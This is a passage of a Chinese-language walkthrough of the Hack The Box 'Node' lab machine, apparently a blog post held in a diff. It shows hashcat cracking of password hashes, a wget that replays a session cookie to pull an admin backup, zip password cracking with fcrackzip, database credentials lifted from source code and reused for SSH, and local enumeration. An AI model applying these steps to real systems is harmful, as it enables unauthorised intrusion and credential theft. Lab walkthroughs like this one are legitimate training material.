(new)<br>Progress.........: 9999/9999 (100.00%)<br>Rejected.........: 0/9999 (0.00%)<br>Restore.Point....: 9999/9999 (100.00%)<br>Restore.Sub.<span class="hljs-comment">#1...: Salt:0 Amplifier:0-1 Iteration:0-1</span><br>Candidate.Engine.: Device Generator<br>Candidates.<span class="hljs-comment">#1....: 123456 -&gt; starstar</span><br>Hardware.Mon.SMC.: Fan0: 0%, Fan1: 0%<br>Hardware.Mon.<span class="hljs-comment">#1..: Util: 74%</span><br><br>Started: Fri Jan  5 22:15:23 2024<br>Stopped: Fri Jan  5 22:15:30 2024<br>shiyan@InfoSec hashcat-6.2.6 %<br></code></pre></td></tr></table></figure>
+
+<p>13、到这里也成功破解出来了几个账号密码</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">f0e2e750791171b0391b682ec35835bd6a5c3f7c8d1d0191451ec77b4d75f240:spongebob<br>dffc504aa55359b9265cbebe1e4032fe600b64475ae3fd29c07d23223334d0af:manchester<br>de5a1adf4fedcce1533915edc60177547f1057b61b7119fd130e1f7428705f73:snowflake<br></code></pre></td></tr></table></figure>
+
+<p>14、尝试登录后台地址</p>
+<p><code>http://10.10.10.58:3000/admin/</code></p>
+<p><img src="http://sh1yan.top/photo/Node-htb-writeup/5.png" srcset="/img/loading.gif" lazyload></p>
+<p>15、登录到后台后，发现是有个压缩包的，但是由于网络原因，我通过浏览器还是命令行，均无法下载下来</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">wget --header <span class="hljs-string">&quot;Cookie: connect.sid=s%3AGKHNZ8musvqC08izw3t5W_9EizgMUT6F.qzF0GfGtQNO4Vz7mNgB%2Fk8elfNahSYoLAsOQN4U3Wkk&quot;</span> http://10.10.10.58:3000/api/admin/backup<br></code></pre></td></tr></table></figure>
+
+<p><img src="http://sh1yan.top/photo/Node-htb-writeup/6.png" srcset="/img/loading.gif" lazyload></p>
+<p>16、这一个片段，我就直接粘贴演练报告里的内容吧</p>
+<p><code>当我们以 myP14ceAdm1nAcc0uNT 身份登录时，我们可以选择下载备份。该myplace.backup文件是 base64 编码的文本，因此我们将对其进行解码，解码后它看起来是一个 zip 存档。</code></p>
+<p><code>luc@kali:~/HTB/Node$ cat myplace.backup | base64 -d &gt; myplace.decoded</code><br><code>luc@kali:~/HTB/Node$ file myplace.decoded</code><br><code>myplace.decoded: Zip archive data, at least v1.0 to extract</code><br><code>luc@kali:~/HTB/Node$ mv myplace.decoded myplace.zip</code></p>
+<p><code>我们需要破解这个 zip 文件的密码。为此，我们将使用fcrackzip 。 https://github.com/hyc/fcrackzip</code><br><code>该 zip 文件受密码保护。让我们使用 fcrackzip 或 zipcracker-ng 来破解它：</code></p>
+<p><code>luc@kali:~/HTB/Node$ fcrackzip -D -p /usr/share/wordlists/rockyou.txt myplace.zip</code><br><code>possible pw found: magicword ()</code><br><code>luc@kali:~/HTB/Node$ unzip -P magicword myplace.zip</code></p>
+<p><code>我们现在可以查看 zip 中的所有文件，包括var/www/myplace/app.js.</code></p>
+<p><code>luc@kali:~/HTB/Node$ less var/www/myplace/app.js</code><br><code>...</code><br><code>const url         = &#39;mongodb://mark:5AYRft73VtFpc84k@localhost:27017/myplace?authMechanism=DEFAULT&amp;authSource=myplace&#39;;</code><br><code>...</code></p>
+<p><code>如果我们探索 backup.zip 中解压的文件，我们会在 var/www/myplace/app.js 中找到一些凭据：</code></p>
+<p><code>$ head -n12 var/www/myplace/app.js</code></p>
+<p><code>const express     = require(&#39;express&#39;);</code><br><code>const session     = require(&#39;express-session&#39;);</code><br><code>const bodyParser  = require(&#39;body-parser&#39;);</code><br><code>const crypto      = require(&#39;crypto&#39;);</code><br><code>const MongoClient = require(&#39;mongodb&#39;).MongoClient;</code><br><code>const ObjectID    = require(&#39;mongodb&#39;).ObjectID;</code><br><code>const path        = require(&quot;path&quot;);</code><br><code>const spawn        = require(&#39;child_process&#39;).spawn;</code><br><code>const app         = express();</code><br><code>const url         = &#39;mongodb://mark:5AYRft73VtFpc84k@localhost:27017/myplace?authMechanism=DEFAULT&amp;authSource=myplace&#39;;</code><br><code>const backup_key  = &#39;45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474&#39;;</code></p>
+<p>17、到这里，发现了一个数据的连接密码，使用该密码，成功登录到了服务器</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs bash">mark<br>5AYRft73VtFpc84k<br><br>┌──(kali㉿kali)-[~/桌面]<br>└─$ ssh mark@10.10.10.58                                        <br>The authenticity of host <span class="hljs-string">&#x27;10.10.10.58 (10.10.10.58)&#x27;</span> can<span class="hljs-string">&#x27;t be established.</span><br><span class="hljs-string">ED25519 key fingerprint is SHA256:l5rO4mtd28sC7Bh8t7rHpUxqmHnGYUDxX1DHmLFrzrk.</span><br><span class="hljs-string">This key is not known by any other names.</span><br><span class="hljs-string">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span><br><span class="hljs-string">Warning: Permanently added &#x27;</span>10.10.10.58<span class="hljs-string">&#x27; (ED25519) to the list of known hosts.</span><br><span class="hljs-string">mark@10.10.10.58&#x27;</span>s password: <br><br>The programs included with the Ubuntu system are free software;<br>the exact distribution terms <span class="hljs-keyword">for</span> each program are described <span class="hljs-keyword">in</span> the<br>individual files <span class="hljs-keyword">in</span> /usr/share/doc/*/copyright.<br><br>Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by<br>applicable law.<br><br><br><br>              .-. <br>        .-<span class="hljs-string">&#x27;``(|||) </span><br><span class="hljs-string">     ,`\ \    `-`.                 88                         88 </span><br><span class="hljs-string">    /   \ &#x27;</span>``-.   `                88                         88 <br>  .-.  ,       `___:      88   88  88,888,  88   88  ,88888, 88888  88   88 <br> (:::) :        ___       88   88  88   88  88   88  88   88  88    88   88 <br>  `-`  `       ,   :      88   88  88   88  88   88  88   88  88    88   88 <br>    \   / ,..-`   ,       88   88  88   88  88   88  88   88  88    88   88 <br>     `./ /    .-.`        <span class="hljs-string">&#x27;88888&#x27;</span>  <span class="hljs-string">&#x27;88888&#x27;</span>  <span class="hljs-string">&#x27;88888&#x27;</span>  88   88  <span class="hljs-string">&#x27;8888 &#x27;</span>88888<span class="hljs-string">&#x27; </span><br><span class="hljs-string">        `-..-(   ) </span><br><span class="hljs-string">              `-` </span><br><span class="hljs-string"></span><br><span class="hljs-string">The programs included with the Ubuntu system are free software;</span><br><span class="hljs-string">the exact distribution terms for each program are described in the</span><br><span class="hljs-string">individual files in /usr/share/doc/*/copyright.</span><br><span class="hljs-string"></span><br><span class="hljs-string">Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by</span><br><span class="hljs-string">applicable law.</span><br><span class="hljs-string"></span><br><span class="hljs-string">Last login: Wed Sep 27 02:33:14 2017 from 10.10.14.3</span><br><span class="hljs-string">mark@node:~$ id</span><br><span class="hljs-string">uid=1001(mark) gid=1001(mark) groups=1001(mark)</span><br><span class="hljs-string">mark@node:~$ pwd</span><br><span class="hljs-string">/home/mark</span><br></code></pre></td></tr></table></figure>
+
+<p>18、但是在接下来的信息查找中，发现我们没有办法直接读取第一个flag文件，因为权限在 tom 这个账号里</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs bash">mark@node:~$ <span class="hljs-built_in">ls</span><br>mark@node:~$ <span class="hljs-built_in">ls</span> ../<br>frank  mark  tom<br>mark@node:~$ <br>mark@node:~$ ss -ltn<br>State       Recv-Q Send-Q Local Address:Port               Peer Address:Port              <br>LISTEN      0      128      127.0.0.1:27017                        *:*                  <br>LISTEN      0      128              *:22                           *:*                  <br>LISTEN      0      128             :::3000                        :::*                  <br>mark@node:~$<br>mark@node:~$ <span class="hljs-built_in">ls</span> -Rl ../<br>../:<br>total 12<br>drwxr-xr-x 2 root root 4096 Aug 31  2017 frank<br>drwxr-xr-x 3 root root 4096 Sep  3  2017 mark<br>drwxr-xr-x 6 root root 4096 Aug 16  2022 tom<br><br>../frank:<br>total 0<br><br>../mark:<br>total 0<br><br>../tom:<br>total 4<br>-rw-r----- 1 root tom 33 Jan  5 13:31 user.txt<br>mark@node:~$<br></code></pre></td></tr></table></figure>
+
+<p>19、通过检索 tom 用户的进程情况，发现了几个关键点</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br></pre></td><td class="code"><pre><code class="hljs bash">mark@node:~$ ps aux | grep tom<br>tom       1244  0.1  9.3 1120856 71092 ?       Ssl  13:31   0:07 /usr/bin/node /var/www/myplace/app.js<br>tom       1492  0.0  5.5 1008568 42160 ?       Ssl  13:31   0:01 /usr/bin/node /var/scheduler/app.js<br>mark      1861  0.0  0.1  11284  1040 pts/0    S+   14:38   0:00 grep --color=auto tom<br>mark@node:~$ <span class="hljs-built_in">cat</span> /var/www/myplace/app.js<br><br>const express     = require(<span class="hljs-string">&#x27;express&#x27;</span>);<br>const session     = require(<span class="hljs-string">&#x27;express-session&#x27;</span>);<br>const bodyParser  = require(<span class="hljs-string">&#x27;body-parser&#x27;</span>);<br>const crypto      = require(<span class="hljs-string">&#x27;crypto&#x27;</span>);<br>const MongoClient = require(<span class="hljs-string">&#x27;mongodb&#x27;</span>).MongoClient;<br>const ObjectID    = require(<span class="hljs-string">&#x27;mongodb&#x27;</span>).ObjectID;<br>const path        = require(<span class="hljs-string">&quot;path&quot;</span>);<br>const spawn        = require(<span class="hljs-string">&#x27;child_process&#x27;</span>).spawn;<br>const app         = express();<br>const url         = <span class="hljs-string">&#x27;mongodb://mark:5AYRft73VtFpc84k@localhost:27017/myplace?authMechanism=DEFAULT&amp;authSource=myplace&#x27;</span>;<br>const backup_key  = <span class="hljs-string">&#x27;45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474&#x27;</span>;<br><br>MongoClient.connect(url, <span class="hljs-keyword">function</span>(error, db) &#123;<br>  <span class="hljs-keyword">if</span> (error || !db) &#123;<br>    console.log(<span class="hljs-string">&#x27;[!] Failed to connect to mongodb&#x27;</span>);<br>    <span class="hljs-built_in">return</span>;<br>  &#125;<br><br>  app.use(session(&#123;<br>    secret: <span class="hljs-string">&#x27;the boundless tendency initiates the law.&#x27;</span>,<br>    cookie: &#123; maxAge: 3600000 &#125;,<br>    resave: <span class="hljs-literal">false</span>,<br>    saveUninitialized: <span class="hljs-literal">false</span><br>  &#125;));<br><br>  app.use(<span class="hljs-keyword">function</span> (req, res, next) &#123;<br>    var agent = req.headers[<span class="hljs-string">&#x27;user-agent&#x27;</span>];<br>    var blacklist = /(DirBuster)|(Postman)|(Mozilla\/4\.0.+Windows NT 5\.1)|(Go\-http\-client)/i;<br><br>    <span class="hljs-keyword">if</span> (!blacklist.test(agent)) &#123;<br>      next();<br>    &#125;<br>    <span class="hljs-keyword">else</span> &#123;<br>      count = Math.floor((Math.random() * <span class="hljs-number">10000</span>) + <span class="hljs-number">1</span>);<br>      randomString = &#x27;&#x27;;<br><br>      var charset = &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789&quot;;<br>      for (var i = <span class="hljs-number">0</span>; i &lt; count; i++)<br>        randomString += charset.charAt(Math.floor(Math.random() * charset.length));<br><br>      res.set(<span class="hljs-string">&#x27;Content-Type&#x27;</span>, <span class="hljs-string">&#x27;text/plain&#x27;</span>).status(200).send(<br>        [<br>          <span class="hljs-string">&#x27;QQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQ&#x27;</span>,<br>          <span class="hljs-string">&#x27;QQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQ&#x27;</span>,<br>          <span class="hljs-string">&#x27;QQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQ&#x27;</span>,<br>          <span class="hljs-string">&#x27;QQQQQQQQQQQQQQQQQQQWQQQQQWWWBBBHHHHHHHHHBWWWQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQ&#x27;</span>,<br>          <span class="hljs-string">&#x27;QQQQQQQQQQQQQQQD!`__ssaaaaaaaaaass_ass_s____.  -~&quot;&quot;??9VWQQQQQQQQQQQQQQQQQQQ&#x27;</span>,<br>          <span class="hljs-string">&#x27;QQQQQQQQQQQQQP\&#x27;</span>_wmQQQWWBWV?GwwwmmWQmwwwwwgmZUVVHAqwaaaac,<span class="hljs-string">&quot;?9<span class="hljs-variable">$QQQQQQQQQQQQQQ</span>&#x27;,</span><br><span class="hljs-string">          &#x27;QQQQQQQQQQQW! aQWQQQQW?qw#TTSgwawwggywawwpY?T?TYTYTXmwwgZ<span class="hljs-variable">$ma</span>/-?4QQQQQQQQQQQ&#x27;,</span><br><span class="hljs-string">          &#x27;QQQQQQQQQQW\&#x27; jQQQQWTqwDYauT9mmwwawww?WWWWQQQQQ@TT?TVTT9HQQQQQQw,-4QQQQQQQQQ&#x27;,</span><br><span class="hljs-string">          &#x27;QQQQQQQQQQ[ jQQQQQyWVw2<span class="hljs-variable">$wWWQQQWWQWWWW7WQQQQQQQQPWWQQQWQQw7WQQQWWc</span>)WWQQQQQQQ&#x27;,</span><br><span class="hljs-string">          &#x27;QQQQQQQQQf jQQQQQWWmWmmQWU???????9WWQmWQQQQQQQWjWQQQQQQQWQmQQQQWL 4QQQQQQQQ&#x27;,</span><br><span class="hljs-string">          &#x27;QQQQQQQP\&#x27;.yQQQQQQQQQQQP&quot;</span>       &lt;wa,.!4WQQQQQQQWdWP??!<span class="hljs-string">&quot;??4WWQQQWQQc ?QWQQQQQ&#x27;,</span><br><span class="hljs-string">          &#x27;QQQQQP\&#x27;_a.&lt;aamQQQW!&lt;yF &quot;</span>!` ..  <span class="hljs-string">&quot;??<span class="hljs-variable">$Qa</span> &quot;</span>WQQQWTVP\<span class="hljs-string">&#x27;    &quot;??\&#x27;</span> =QQmWWV?46/ ?QQQQQ<span class="hljs-string">&#x27;,</span><br><span class="hljs-string">          &#x27;</span>QQQP\<span class="hljs-string">&#x27;sdyWQP?!`.-&quot;?46mQQQQQQT!mQQgaa. &lt;wWQQWQaa _aawmWWQQQQQQQQQWP4a7g -WWQQ&#x27;</span>,<br>          <span class="hljs-string">&#x27;QQ[ j@mQP\&#x27;</span>adQQP4ga, -????<span class="hljs-string">&quot; &lt;jQQQQQWQQQQQQQQQWW;)WQWWWW9QQP?&quot;</span>`  -?QzQ7L ]QQQ<span class="hljs-string">&#x27;,</span><br><span class="hljs-string">          &#x27;</span>QW jQkQ@ jWQQD\<span class="hljs-string">&#x27;-?$QQQQQQQQQQQQQQQQQWWQWQQQWQQQc &quot;4QQQQa   .QP4QQQQfWkl jQQQ&#x27;</span>,<br>          <span class="hljs-string">&#x27;QE ]QkQk $D?`  waa &quot;?9WWQQQP??T?47`_aamQQQQQQWWQw,-?QWWQQQQQ`&quot;QQQD\Qf(.QWQQ&#x27;</span>,<br>          <span class="hljs-string">&#x27;QQ,-Qm4Q/-QmQ6 &quot;WWQma/  &quot;??QQQQQQL 4W&quot;- -?$QQQQWP`s,awT$QQQ@  &quot;QW@?$:.yQQQQ&#x27;</span>,<br>          <span class="hljs-string">&#x27;QQm/-4wTQgQWQQ,  ?4WWk 4waac -???$waQQQQQQQQF??\&#x27;</span>&lt;mWWWWWQW?^  ` ]6QQ\<span class="hljs-string">&#x27; yQQQQQ&#x27;</span>,<br>          <span class="hljs-string">&#x27;QQQQw,-?QmWQQQQw  a,    ?QWWQQQw _.  &quot;????9VWaamQWV???&quot;  a j/  ]QQf jQQQQQQ&#x27;</span>,<br>          <span class="hljs-string">&#x27;QQQQQQw,&quot;4QQQQQQm,-$Qa     ???4F jQQQQQwc &lt;aaas _aaaaa 4QW ]E  )WQ`=QQQQQQQ&#x27;</span>,<br>          <span class="hljs-string">&#x27;QQQQQQWQ/ $QQQQQQQa ?H ]Wwa,     ???9WWWh dQWWW,=QWWU?  ?!     )WQ ]QQQQQQQ&#x27;</span>,<br>          <span class="hljs-string">&#x27;QQQQQQQQQc-QWQQQQQW6,  QWQWQQQk &lt;c                             jWQ ]QQQQQQQ&#x27;</span>,<br>          <span class="hljs-string">&#x27;QQQQQQQQQQ,&quot;$WQQWQQQQg,.&quot;?QQQQ\&#x27;</span>.mQQQmaa,.,                . .; QWQ.]QQQQQQQ<span class="hljs-string">&#x27;,</span><br><span class="hljs-string">          &#x27;</span>QQQQQQQQQWQa ?<span class="hljs-variable">$WQQWQQQQQa</span>,.<span class="hljs-string">&quot;?( mQQQQQQW[:QQQQm[ ammF jy! j( &#125; jQQQ(:QQQQQQQ&#x27;,</span><br><span class="hljs-string">          &#x27;QQQQQQQQQQWWma &quot;</span>9gw?9gdB?QQwa, -??T<span class="hljs-variable">$WQQ</span>;:QQQWQ ]WWD _Qf +?! _jQQQWf QQQQQQQ<span class="hljs-string">&#x27;,</span><br><span class="hljs-string">          &#x27;</span>QQQQQQQQQQQQQQQws <span class="hljs-string">&quot;Tqau?9maZ?WQmaas,,    --~-- ---  . _ssawmQQQQQQk 3QQQQWQ&#x27;,</span><br><span class="hljs-string">          &#x27;QQQQQQQQQQQQQQQQWQga,-?9mwad?1wdT9WQQQQQWVVTTYY?YTVWQQQQWWD5mQQPQQQ ]QQQQQQ&#x27;,</span><br><span class="hljs-string">          &#x27;QQQQQQQWQQQQQQQQQQQWQQwa,-??<span class="hljs-variable">$QwadV</span>&#125;&lt;wBHHVHWWBHHUWWBVTTTV5awBQQD6QQQ ]QQQQQQ&#x27;,</span><br><span class="hljs-string">          &#x27;QQQQQQQQQQQQQQQQQQQQQQWWQQga,-&quot;</span>9<span class="hljs-variable">$WQQmmwwmBUUHTTVWBWQQQQWVT</span>?96aQWQQQ ]QQQQQQ<span class="hljs-string">&#x27;,</span><br><span class="hljs-string">          &#x27;</span>QQQQQQQQQQWQQQQWQQQQQQQQQQQWQQma,-?9<span class="hljs-variable">$QQWWQQQQQQQWmQmmmmmQWQQQQWQQW</span>(.yQQQQQW<span class="hljs-string">&#x27;,</span><br><span class="hljs-string">          &#x27;</span>QQQQQQQQQQQQQWQQQQQQWQQQQQQQQQQQQQga%,.  -??9<span class="hljs-variable">$QQQQQQQQQQQWQQWQQV</span>? sWQQQQQQQ<span class="hljs-string">&#x27;,</span><br><span class="hljs-string">          &#x27;</span>QQQQQQQQQWQQQQQQQQQQQQQQWQQQQQQQQQQQWQQQQmywaa,;~^<span class="hljs-string">&quot;!???????!^`_saQWWQQQQQQQ&#x27;,</span><br><span class="hljs-string">          &#x27;QQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQWWWWQQQQQmwywwwwwwmQQWQQQQQQQQQQQ&#x27;,</span><br><span class="hljs-string">          &#x27;QQQQQQQWQQQWQQQQQQWQQQWQQQQQWQQQQQQQQQQQQQQQQWQQQQQWQQQWWWQQQQQQQQQQQQQQQWQ&#x27;,</span><br><span class="hljs-string">          &#x27;&#x27;,</span><br><span class="hljs-string">          &#x27;&#x27;,</span><br><span class="hljs-string">          &#x27;&lt;!-- &#x27; + randomString + &#x27; --&gt;&#x27;</span><br><span class="hljs-string">        ].join(&quot;</span>\n<span class="hljs-string">&quot;)</span><br><span class="hljs-string">      );</span><br><span class="hljs-string">    &#125;</span><br><span class="hljs-string">  &#125;);</span><br><span class="hljs-string"></span><br><span class="hljs-string">  app.use(express.static(path.join(__dirname, &#x27;static&#x27;)));</span><br><span class="hljs-string">  app.use(bodyParser.json());</span><br><span class="hljs-string">  app.use(function(err, req, res, next) &#123;</span><br><span class="hljs-string">    if (err) &#123;</span><br><span class="hljs-string">      res.status(err.status || 500);</span><br><span class="hljs-string">      res.send(&#123;</span><br><span class="hljs-string">        message:&quot;</span>Uh oh, something went wrong!<span class="hljs-string">&quot;,</span><br><span class="hljs-string">        error: true</span><br><span class="hljs-string">      &#125;);</span><br><span class="hljs-string">    &#125;</span><br><span class="hljs-string">    else &#123;</span><br><span class="hljs-string">      next();</span><br><span class="hljs-string">    &#125;</span><br><span class="hljs-string">  &#125;);</span><br><span class="hljs-string"></span><br><span class="hljs-string">  app.get(&#x27;/api/users/?&#x27;, function (req, res) &#123;</span><br><span class="hljs-string">    db.collection(&#x27;users&#x27;).find().toArray(function (error, docs) &#123;</span><br><span class="hljs-string">      if (error) &#123;</span><br><span class="hljs-string">        res.status(500).send(&#123; error: true &#125;);</span><br><span class="hljs-string">      &#125;</span><br><span class="hljs-string">      else if (!docs) &#123;</span><br><span class="hljs-string">        res.status(404).send(&#123; not_found: true &#125;);</span><br><span class="hljs-string">      &#125;</span><br><span class="hljs-string">      else &#123;</span><br><span class="hljs-string">        res.send(docs);</span><br><span class="hljs-string">      &#125;</span><br><span class="hljs-string">    &#125;);</span><br><span class="hljs-string">  &#125;);</span><br><span class="hljs-string"></span><br><span class="hljs-string">  app.get(&#x27;/api/users/latest&#x27;, function (req, res) &#123;</span><br><span class="hljs-string">    db.collection(&#x27;users&#x27;).find(&#123; is_admin: false &#125;).toArray(function (error, docs) &#123;</span><br><span class="hljs-string">      if (error) &#123;</span><br><span class="hljs-string">        res.status(500).send(&#123; error: true &#125;);</span><br><span class="hljs-string">      &#125;</span><br><span class="hljs-string">      else if (!docs) &#123;</span><br><span class="hljs-string">        res.status(404).send(&#123; not_found: true &#125;);</span><br><span class="hljs-string">      &#125;</span><br><span class="hljs-string">      else &#123;</span><br><span class="hljs-string">        res.send(docs);</span><br><span class="hljs-string">      &#125;</span><br><span class="hljs-string">    &#125;);</span><br><span class="hljs-string">  &#125;);</span><br><span class="hljs-string"></span><br><span class="hljs-string">  app.get(&#x27;/api/users/:username&#x27;, function (req, res) &#123;</span><br><span class="hljs-string">    db.collection(&#x27;users&#x27;).findOne(&#123; username: req.params.username &#125;, function (error, doc) &#123;</span><br><span class="hljs-string">      if (error) &#123;</span><br><span class="hljs-string">        res.status(500).send(&#123; error: true &#125;);</span><br><span class="hljs-string">      